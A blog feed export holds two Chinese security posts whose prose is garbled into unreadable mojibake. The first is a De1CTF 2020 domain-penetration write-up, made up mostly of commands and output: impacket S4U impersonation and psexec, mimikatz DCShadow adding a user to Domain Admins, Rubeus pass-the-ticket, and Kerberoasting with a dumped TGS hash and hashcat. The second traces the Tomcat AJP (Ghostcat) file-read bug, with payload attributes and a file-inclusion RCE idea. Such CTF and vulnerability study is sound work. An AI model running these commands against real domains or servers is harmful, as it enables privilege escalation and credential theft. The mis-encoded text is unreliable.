<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -spn cifs&#x2F;dm.De1CTF2020.lab De1CTF2020&#x2F;lisan4$</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-master&#x2F;examples&#x2F;lisan4$.ccache</span><br><span class="line">proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -k -impersonate Administrator -spn cifs&#x2F;dm.De1CTF2020.lab De1CTF2020&#x2F;lisan4$</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-master&#x2F;examples&#x2F;Administrator.ccache</span><br><span class="line">proxychains psexec.py -k -no-pass dm.De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<p><strong>è¿™é‡Œä¸€å®šæ³¨æ„è¦ç”¨fqdnï¼ˆdm.De1CTF2020.labï¼‰æ¥è¯·æ±‚ï¼Œä¸è¦ç”¨ipã€‚</strong><br><strong>è¿™é‡Œä¸€å®šæ³¨æ„è¦ç”¨fqdnï¼ˆdm.De1CTF2020.labï¼‰æ¥è¯·æ±‚ï¼Œä¸è¦ç”¨ipã€‚</strong><br><strong>è¿™é‡Œä¸€å®šæ³¨æ„è¦ç”¨fqdnï¼ˆdm.De1CTF2020.labï¼‰æ¥è¯·æ±‚ï¼Œä¸è¦ç”¨ipã€‚</strong><br><strong><img src="1588579527302-5542f401-8459-4357-9d30-f4d0bbb75834.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1294&originWidth=2110&size=852755&status=done&style=none&width=1055" alt="image.png"></strong><br>æœ‰systemæƒé™åå°±æ˜¯Dcshadowçš„æ“ä½œäº†</p>
<p>systemæƒé™ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell mimikatz.exe &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow &#x2F;object:de1ta &#x2F;attribute:primaryGroupID &#x2F;value:512&quot;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä¸€ç›´ä»¥ä¸ºè¿™ç§éäº¤äº’å¼çš„mimkatzè¿è¡Œå®Œä¼šè¢«beaconè‡ªåŠ¨å…³é—­æ‰ï¼Œå®é™…æµ‹ä¸‹æ¥å¹¶ä¸ä¼šã€‚<br><img src="1588580027676-64acd1f2-4138-4a48-8328-e8c898022ff7.png#align=left&display=inline&height=721&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1442&originWidth=2398&size=323731&status=done&style=none&width=1199" alt="image.png"><br>De1taæƒé™ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell mimikatz.exe &quot;lsadump::dcshadow &#x2F;push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="1588580226016-f9634854-eaa3-4542-b4aa-5b6a59536ee9.png#align=left&display=inline&height=702&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1404&originWidth=2018&size=262325&status=done&style=none&width=1009" alt="image.png"><br>æ‰§è¡Œå®Œåsystemé‚£è¾¹ä¼šæœ‰ååº”<br><img src="1588580304255-65913d34-697b-402d-ac44-1a37b924c90c.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=774&originWidth=1562&size=123041&status=done&style=none&width=781" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<p>ä¼šå‘ç°åŠ ä¸Šäº†<br><img src="1588580360804-da863178-d3eb-4ec1-aeb2-cc6c9c9042b9.png#align=left&display=inline&height=279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1432&size=73835&status=done&style=none&width=746" alt="image.png"><br>ç…§ç†å¯ä»¥ç›´æ¥diräº†ä½†æ˜¯æœ€åè¿˜æ˜¯æœ‰ä¸€ä¸ªè«åå…¶å¦™çš„å‘ï¼ˆå¿½è§†å›¾ä¸­æŠŠè·¯å¾„å†™é”™äº†ï¼Œä¸è¿‡ä¸å½±å“è¿™é‡Œçš„æ„æ€å°±æ˜¯æ²¡æƒé™ï¼Œè·¯å¾„ä¸å­˜åœ¨æ˜¯å¦å¤–ä¸€ä¸ªæŠ¥é”™ï¼‰<br><img src="1588580430211-30595b4a-cadb-4f8e-87b1-2a0d2913d5a9.png#align=left&display=inline&height=297&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=1720&size=125984&status=done&style=none&width=860" alt="image.png"><br>ç”¨rubuesé‡æ–°æ¥ä¸€æ¬¡tgtå°±å¥½äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell Rubeus.exe asktgt &#x2F;user:de1ta &#x2F;rc4:B03094996601324646AC223BF30D0D07 &#x2F;domain:de1ctf2020.lab &#x2F;ptt</span><br><span class="line">shell type \\dc\c$\users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="1588580555529-42793246-2e0e-45ea-a113-9cebe5dc9d0f.png#align=left&display=inline&height=117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=214&originWidth=1364&size=44777&status=done&style=none&width=746" alt="image.png"></p>
<h2 id="æ¥è¯´è¯´é¢„æœŸè§£æ‹¿åˆ°De1taè´¦å·å¯†ç "><a href="#æ¥è¯´è¯´é¢„æœŸè§£æ‹¿åˆ°De1taè´¦å·å¯†ç " class="headerlink" title="æ¥è¯´è¯´é¢„æœŸè§£æ‹¿åˆ°De1taè´¦å·å¯†ç "></a>æ¥è¯´è¯´é¢„æœŸè§£æ‹¿åˆ°De1taè´¦å·å¯†ç </h2><p><img src="1588585694577-60526aee-a9a7-4263-ba3d-8085030371f6.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=1810&size=134342&status=done&style=none&width=905" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell setspn -s http&#x2F;DM.De1CTF2020.lab De1CTF2020\De1ta</span><br></pre></td></tr></table></figure>

<p><img src="1588585758205-e69fc027-0b02-4e6f-b516-8785fa075439.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&name=image.png&originHeight=344&originWidth=1426&size=63731&status=done&style=none&width=713" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>

<p><img src="1588585820496-1b01ef87-4f61-424c-a363-3a1e47de1be5.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1226&size=83062&status=done&style=none&width=746" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;Empire&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1</span><br><span class="line">powershell Invoke-Kerberoast</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TicketByteHexStream  : </span><br><span class="line">Hash                 : $krb5tgs$http&#x2F;DM.De1CTF2020.lab:0B5E0028717C31BF16F95DDF</span><br><span class="line">                       CA441A51$A71E43FD37E2E10E3029FE2767B0266CCABE13F68B27A46</span><br><span class="line">                       955A440DA3F3B4AF1D4C7A8C357B69655364C27DA73C80FBE9075A94</span><br><span class="line">                       615EB720E7A3E1E8610A1C18962338E87479D0A17D902B904B4DE4B5</span><br><span class="line">                       AD3BAE015D3709899570BD6D25392C9E98345535523CCBE65125B0E7</span><br><span class="line">                       1F2482040F2347DD13B7062B8A9E6DAA5C79F2843A2F030BBA0DCA91</span><br><span class="line">                       8FFEEE32D61BCAF4453315AAED98A427CF843C71EDB3EFBD2F47EF83</span><br><span class="line">                       9229E51A6A10A9D180B6EAF698B9C5D446F61BCA21E59413EC380A3F</span><br><span class="line">                       426F941EA42704B7262812E44FA1F04F05DAFF0E06B5690538D3BB8B</span><br><span class="line">                       10263FE97E05D6FE9F9E5BF1EFFF6A0344FA8F8B20CC0AA39BF95538</span><br><span class="line">                       4C3B543BF9B9A4E23C8F071D24E846F284A6FE62278E76ED47897FB2</span><br><span class="line">                       3264CC57A7EDE8C613EAD87914C511F2554AAEA6F663E66B8BA0760C</span><br><span class="line">                       296F82253303A5FF2DF5F8343AD2097F57B376BF83C302D806D620B9</span><br><span class="line">                       8ED2D3C53DF65AE37A7D6356EFC1A9123CCF56549A5288C132E3F5D0</span><br><span class="line">                       5A066CE50FFCB654BF79FD5F673175F9AD98C1140E8B50D0F574080A</span><br><span class="line">                       48EADBFBB00668B96A79F95E429CC42B4BD3CA2C9A106CD6D39312D9</span><br><span class="line">                       BD13B4452861E47DD71F36D3DAD4A570480D56BDEF1F278518219FA2</span><br><span class="line">                       5D076758B994C5F4EC8CF49C85DA1CFFAC91DF63AB5D71EF5135CD36</span><br><span class="line">                       D54FCB9C2A9EF61D67A3BC01EF668F255A66487F3493BE0F8352EAFF</span><br><span class="line">                       A009D561BE459F1130C6A3AF81060FD82232B3E430A196C5580FBDBB</span><br><span class="line">                       3EEAC6AA6FD2774063CB16C1CB161B20CD6ED3BF414349DECCCF8753</span><br><span class="line">                       9CE1EEBC28DD27DCE32752640F22817286211841DE22191300D75970</span><br><span class="line">                       D721021FA1211FA368A14EACEBABA5B42B1F3B087CE04782A695F046</span><br><span class="line">                       1CCCDC1445DE56D31582825E2824E47499C91A396D867A4284C4DD40</span><br><span class="line">                       AD1E1AF7A2073729FCB66A52C076A7F3515C93F54189CBDAAF408838</span><br><span class="line">                       736CA682CFF82CBA4DBFF757CD297CC16FF0A8F6F7C9F206ACB5BB87</span><br><span class="line">                       61C54AD1635572C16E6FC01B40E6F84F71153514EA21A87B28358A38</span><br><span class="line">                       4B3ECA5206F35EE3732DADE97726E07E8FEBE3D7EE3A77A2A4EEE1BE</span><br><span class="line">                       59F4EC5336E4F65D2A4F111C79A73D24F9BDFCCBEAEAC5768538EFAD</span><br><span class="line">                       00A191BB7941DF4A441BB83D061D42CB59D03A61921117DB835AA1D0</span><br><span class="line">                       DEB00AD6BC4A694CC39A465CF23447D7CDB1F19EBFCB92C555E75CE6</span><br><span class="line">                       7999B76A4FE22D1D34AF706A1505DC027D8BDC8A0055095605255BB8</span><br><span class="line">                       F437551248B77A559463C39934A6A95F183DD1FF5C4152949C0B6F69</span><br><span class="line">                       6C4B6A649A4B207CE4202B8884F54C1BC9ECA86F966EF2B86F3A89D3</span><br><span class="line">                       1E07C880C5E5DBCD35338FB485A46E74779D45BF38E2398A16377C15</span><br><span class="line">                       43E32DACFF71713DBF7288640AA751FC5A51B8DF873BBEB1F946331C</span><br><span class="line">                       CF59E6FC4209322D9BCAB8C51F5B408545BA9C4DA11755B4477DF968</span><br><span class="line">                       90F72E86D900D78BE6006BD14E1380725D1D8</span><br><span class="line">SamAccountName       : De1ta</span><br><span class="line">DistinguishedName    : CN&#x3D;De1ta,CN&#x3D;Users,DC&#x3D;De1CTF2020,DC&#x3D;lab</span><br><span class="line">ServicePrincipalName : http&#x2F;DM.De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 kerberos.txt cracks.txt</span><br></pre></td></tr></table></figure>

<p>psï¼šç”¨psä¹Ÿå¯ä»¥GetSPNUser</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;wintool&#x2F;kerberoast&#x2F;GetUserSPNs.ps1</span><br><span class="line">powershell GetUserSPNs</span><br></pre></td></tr></table></figure>

<p><img src="1588586928131-13925d80-d0b6-473b-9610-c1a4dc4fa2e2.png#align=left&display=inline&height=607&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1214&originWidth=3316&size=393681&status=done&style=none&width=1658" alt="image.png"></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat ajp æ¼æ´åˆ†æ</title>
    <url>/2020/04/26/tomcat-ajp-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- æ¼æ´åŸç†æœ¬èº«å¾ˆç®€å•ï¼Œå€¼å¾—å­¦ä¹ çš„æ˜¯tomcatè¿è¡Œçš„å®è§‚æµç¨‹ï¼Œå€¼å¾—æ€è€ƒçš„æ˜¯é•¿äº­çš„å¸ˆå‚…æ˜¯æ€ä¹ˆæŒ–åˆ°çš„ã€‚ -->
<!-- more -->

<h2 id="ä»€ä¹ˆæ˜¯ajp"><a href="#ä»€ä¹ˆæ˜¯ajp" class="headerlink" title="ä»€ä¹ˆæ˜¯ajp"></a>ä»€ä¹ˆæ˜¯ajp</h2><p>ç®€å•ç†è§£æˆhttpçš„äºŒè¿›åˆ¶ä¼˜åŒ–ç‰ˆã€‚<br><img src="1586848883054-0b35011f-8666-4ece-b2ab-91515b6858d2.png#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&name=image.png&originHeight=300&originWidth=699&size=65236&status=done&style=none&width=746" alt="image.png"></p>
<h2 id="tomcatç»“æ„"><a href="#tomcatç»“æ„" class="headerlink" title="tomcatç»“æ„"></a>tomcatç»“æ„</h2><p>åœ¨Containeréƒ¨åˆ†ï¼Œä¸€ä¸ªHostä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œä¸€ä¸ªContextä»£ç ä¸€å¥—webç¨‹åºï¼Œä¸€ä¸ªWrapperä»£è¡¨ä¸€ä¸ªserlvletã€‚ä¸€ä¸ªtomcatå¯ä»¥æœ‰å¤šä¸ªHostï¼Œä¸€ä¸ªHostå¯ä»¥æœ‰å¤šä¸ªContextï¼Œä¸€ä¸ªContextå¾€å¾€æœ‰å¤šä¸ªWrapperã€‚<br><img src="1586848550182-49e7237d-f5f0-41ec-8fd0-8d3d2812569e.png#align=left&display=inline&height=564&margin=%5Bobject%20Object%5D&name=image.png&originHeight=705&originWidth=933&size=197577&status=done&style=none&width=746" alt="image.png"></p>
<p>åœ¨Conectoréƒ¨åˆ†Endpointçš„Acceptorç›‘å¬è¿æ¥ï¼ŒHandlerç”¨äºå¤„ç†æ¥æ”¶åˆ°çš„Socketï¼Œåœ¨å†…éƒ¨è°ƒç”¨Processorè¿›è¡Œå¤„ç†ã€‚processoræŠŠä¿¡æ¯è¯»å–å‡ºæ¥å¹¶è®¾ç½®è¿›requestä¸­å¯¹è±¡æœ€åäº¤ç»™Adaptorï¼ŒAdapterå°†è¯·æ±‚é€‚é…åˆ°Servletå®¹å™¨è¿›è¡Œå…·ä½“çš„å¤„ç†ã€‚<br><img src="1586848576204-d9c37880-c814-47ec-be54-a306d6189fa5.png#align=left&display=inline&height=325&margin=%5Bobject%20Object%5D&name=image.png&originHeight=457&originWidth=1050&size=78935&status=done&style=none&width=746" alt="image.png"></p>
<h2 id="ç¯å¢ƒè¯´æ˜"><a href="#ç¯å¢ƒè¯´æ˜" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h2><p>tomcat 7.0.96</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"> Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment">  contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment">  this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment">  The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment">  (the "License"); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment">  the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">                      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">"3.0"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">metadata-complete</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Welcome to Tomcat<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">     Welcome to Tomcat</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="ä»£ç æµç¨‹è·Ÿè¸ª"><a href="#ä»£ç æµç¨‹è·Ÿè¸ª" class="headerlink" title="ä»£ç æµç¨‹è·Ÿè¸ª"></a>ä»£ç æµç¨‹è·Ÿè¸ª</h2><p>ä»£ç è·Ÿè¸ªä»handlerè°ƒç”¨processorçš„processå¼€å§‹ã€‚<br><img src="1586853383398-98ae9333-1d19-4dc9-86fa-9b912bc79233.png#align=left&display=inline&height=473&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1758&originWidth=2770&size=598418&status=done&style=none&width=746" alt="image.png"><br>processé‡Œé¢æœ‰ä¸¤éƒ¨å¾ˆé‡è¦ä¸€ä¸ªæ˜¯prepareRequestï¼Œå¦ä¸€ä¸ªæ˜¯this.adapter.serviceã€‚<img src="1586863715345-6ad632aa-82f6-421e-a9f3-a2af6b8cb53c.png#align=left&display=inline&height=448&margin=%5Bobject%20Object%5D&name=image.png&originHeight=896&originWidth=2356&size=258201&status=done&style=none&width=1178" alt="image.png"></p>
<h3 id="prepareRequest"><a href="#prepareRequest" class="headerlink" title="prepareRequest"></a>prepareRequest</h3><p>å…ˆæ¥çœ‹prepareRequestã€‚é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æŠŠajpçš„äºŒè¿›åˆ¶ç‰ˆçš„httpæ•°æ®è¯»å–ï¼ˆè¯·æ±‚æ–¹æ³•ï¼Œè¯·æ±‚è·¯å¾„ï¼Œhttpå¤´ç­‰ä¿¡æ¯ï¼Œä¸æ¯å¤„éƒ½æˆªå›¾äº†ï¼‰å¹¶è®¾ç½®è¿›requestå¯¹è±¡ï¼Œç„¶åè®¾ç½®ä¸€äº›å¯¹headerå’Œcookiesé•¿åº¦æˆ–æ•°é‡åšä¸€äº›é™åˆ¶ã€‚<br><img src="1586864450769-bb69818d-8d74-44e7-ae48-bf781e2d6104.png#align=left&display=inline&height=469&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1996&size=261734&status=done&style=none&width=998" alt="image.png"><br>æ¥ä¸‹æ¥ä¼šè¯»å–ä¸€ä¸ªå«attributeCodeçš„ä¸œè¥¿ï¼Œpayloadæœ‰æ„æŠŠå®ƒè®¾ç½®æˆäº†10ã€‚è¿™æ ·ä»–ä¼šæŠŠæˆ‘ä»¬åœ¨payloadä¸­æ„é€ çš„attributesè®¾ç½®è¿›requestå¯¹è±¡çš„attributeï¼Œåé¢ä»»æ„è¯»æ–‡ä»¶æˆ–è€…åŒ…å«ç¥¸èµ·å°±æ˜¯ä»è¿™é‡Œå¼€å§‹çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_path = <span class="string">"/WEB-INF/web.xml"</span></span><br><span class="line"></span><br><span class="line">attributes = [</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.path_info"</span>, file_path,)&#125;,</span><br><span class="line">    &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">"/"</span>,)&#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><img src="1586864883149-eb93af17-dd1e-4e89-9559-14f8929b7952.png#align=left&display=inline&height=345&margin=%5Bobject%20Object%5D&name=image.png&originHeight=690&originWidth=2204&size=205872&status=done&style=none&width=1102" alt="image.png"></p>
<h3 id="adapter-service"><a href="#adapter-service" class="headerlink" title="adapter.service"></a>adapter.service</h3><p>åœ¨adapter.serviceä¸­ä¼šåœ¨postParseRequestä¸­å¯¹urlè¿›è¡Œå¤„ç†åŠåˆæ³•æ€§æ£€æŸ¥ï¼ˆè¿™é‡Œé¢å¯èƒ½æ¶‰åŠåˆ°å¯¹urlæƒé™æ ¡éªŒçš„é—®é¢˜ä»¥åæœ‰æœºä¼šå†èŠï¼‰ã€‚å¦‚æœåˆæ³•çš„ä¼šè¿›å…¥ä¸‹é¢çš„invokeã€‚<br><img src="1586865838743-26dc4c06-7ea3-46d2-9cb9-2f36aedfafe5.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&name=image.png&originHeight=356&originWidth=2738&size=149846&status=done&style=none&width=1369" alt="image.png"></p>
<p>è·Ÿè¿›invokeåä¼šå‘ç°æ˜¯ä¸€è¿ä¸²ç–¯ç‹‚çš„invokeï¼Œè¿™é‡Œå–å‡ ä¸ªæœ‰ä»£è¡¨æ€§çš„æˆªå›¾<br>StandardEngineValve invoke<br><img src="1586923179322-45d6b282-158d-4eaf-9dfb-5004711c2893.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1124&originWidth=2454&size=310682&status=done&style=none&width=746" alt="image.png"><br>StandardHostValve invoke<br><img src="1586923274206-c60e2df8-166c-4b35-9f38-82b3551ec6fc.png#align=left&display=inline&height=798&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1596&originWidth=2724&size=515506&status=done&style=none&width=1362" alt="image.png"><br>StandardContextValve invoke<br><img src="1586923319531-6fa17c23-a6aa-41f8-a647-dd67f73ded50.png#align=left&display=inline&height=791&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1582&originWidth=2626&size=464917&status=done&style=none&width=1313" alt="image.png"><br>æœ€åè¿›å…¥StandardWrapperValveçš„invoke<br>wrapper.allocateä¼šè¿”å›è¿™æ¬¡è¯·æ±‚å¯¹åº”çš„servletï¼Œå› ä¸ºæˆ‘ä»¬è®¿é—®è·¯å¾„æ˜¯/ï¼Œæ‰€ä»¥é»˜è®¤å¯¹åº”index.jspï¼Œæ‰€ä»¥ç”±jspServletæ¥å¤„ç†ã€‚<br><img src="1586923891934-b3956df4-f6f8-43eb-89a2-2efb12440777.png#align=left&display=inline&height=543&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1676&originWidth=2304&size=460267&status=done&style=none&width=746" alt="image.png"><br>æ¥ä¸‹æ¥è¿›å…¥è¿‡æ»¤å™¨é“¾<br><img src="1586931342555-5573ca98-21b6-41ea-abbb-9356e6503285.png#align=left&display=inline&height=323&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1078&originWidth=2486&size=327697&status=done&style=none&width=746" alt="image.png"><br>doFilterå†…éƒ¨è°ƒç”¨internalDoFilter<br><img src="1586950100578-c1b80b6c-7907-432f-92e4-94e9922ec789.png#align=left&display=inline&height=658&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1316&originWidth=2532&size=291640&status=done&style=none&width=1266" alt="image.png"><br>åœ¨internalDoFilterä¸­ä¼šéå†æ‰€æœ‰æ³¨å†Œè¿‡çš„filterç„¶åè¿›è¡Œè¿‡æ»¤ã€‚éå†å®Œæˆåä¼šè°ƒç”¨å¯¹åº”servletçš„servicesæ–¹æ³•ã€‚<br><img src="1586950744560-48b72337-e4aa-448a-ac97-4fed3e26894e.png#align=left&display=inline&height=221&margin=%5Bobject%20Object%5D&name=image.png&originHeight=442&originWidth=2248&size=110370&status=done&style=none&width=1124" alt="image.png"><br><img src="1586951186394-890844d7-b6a7-466b-804b-ea89313f8f6a.png#align=left&display=inline&height=665&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1330&originWidth=2734&size=376224&status=done&style=none&width=1367" alt="image.png"><br>è¿™é‡Œä¼šæŠŠpayloadä¸­çš„ javax.servlet.include.request_uri javax.servlet.include.path_infoæå–å¹¶æ‹¼æ¥åˆ°ä¸€èµ·å½¢æˆjspUriã€‚<br><img src="1586960289652-da60cd10-c25c-4414-88e4-9368fc30f9fe.png#align=left&display=inline&height=630&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1260&originWidth=2702&size=334635&status=done&style=none&width=1351" alt="image.png"><br>è¿™é‡ŒjspUriä¼šè¢«ä¼ å…¥ï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œä¼ å…¥çš„æ˜¯jspï¼Œtomcatä¼šæŠŠjspè½¬ä¸ºservletï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„æ˜¯æ˜¯éjspæ–‡ä»¶ä¸ç¬¦åˆè¯­æ³•æ‰€ä»¥è¿™éƒ¨åˆ†åŸæ ·è¾“å‡ºã€‚å› æ­¤å¦ä¸€ç§ä½¿ç”¨æ–¹æ³•ä¹Ÿå‘¼ä¹‹æ¬²å‡ºï¼Œå¦‚æœæœ‰ä¸€ä¸ªä¸Šä¼ æ´å¯ä»¥æŠŠæ–‡ä»¶ä¸Šä¼ åˆ°webappç›®å½•ä¸‹(ä¸ç®¡ä»€ä¹ˆåç¼€ï¼‰é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åŒ…å«è¿™ä¸ªæ–‡ä»¶è¾¾åˆ°rceæ•ˆæœï¼ˆå’Œphpå¾ˆåƒï¼‰ã€‚<br><img src="1586960624486-d7fff066-76db-4488-8574-0225b80ab005.png#align=left&display=inline&height=563&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1126&originWidth=1994&size=216493&status=done&style=none&width=997" alt="image.png"><br><img src="1586961002526-9f14dac1-fb1f-4c34-8d11-c81d79c5f330.png#align=left&display=inline&height=323&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=2736&size=192472&status=done&style=none&width=1368" alt="image.png"><br><img src="1586961828973-04fb72ff-63d4-4c35-802e-8f9fafd30083.png#align=left&display=inline&height=520&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1040&originWidth=2620&size=348008&status=done&style=none&width=1310" alt="image.png"></p>
<p>è¡¥å……ï¼Œåªèƒ½åŒ…å«webappä¸‹é¢çš„ä¸œè¥¿ã€‚åœ¨è¯»å–ä¹‹å‰ä¼šå¯¹ä¼ å…¥çš„è·¯å¾„è¿›è¡Œæ ¼å¼åŒ–ï¼Œå¹¶åœ¨æ ¼å¼åŒ–åå¼ºåˆ¶åŠ /ï¼Œæ— æ³•../è·³å‡ºã€‚<br><img src="1586962499263-2e94b420-3934-43ba-9b82-2f845a5e7f6f.png#align=left&display=inline&height=383&margin=%5Bobject%20Object%5D&name=image.png&originHeight=766&originWidth=2320&size=231720&status=done&style=none&width=1160" alt="image.png"></p>
<h2 id="ä»£ç æµç¨‹è·Ÿè¸ªå›¾"><a href="#ä»£ç æµç¨‹è·Ÿè¸ªå›¾" class="headerlink" title="ä»£ç æµç¨‹è·Ÿè¸ªå›¾"></a>ä»£ç æµç¨‹è·Ÿè¸ªå›¾</h2><p><img src="1586849002838-3c230310-b346-46ad-b5e0-e636797563c6.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=942&size=83164&status=done&style=none&width=746" alt="image.png"></p>
<h2 id="å—å½±å“ç‰ˆæœ¬"><a href="#å—å½±å“ç‰ˆæœ¬" class="headerlink" title="å—å½±å“ç‰ˆæœ¬"></a>å—å½±å“ç‰ˆæœ¬</h2><ul>
<li>Apache Tomcat 9.x &lt; 9.0.31</li>
<li>Apache Tomcat 8.x &lt; 8.5.51</li>
<li>Apache Tomcat 7.x &lt; 7.0.100</li>
<li>Apache Tomcat 6.x</li>
</ul>
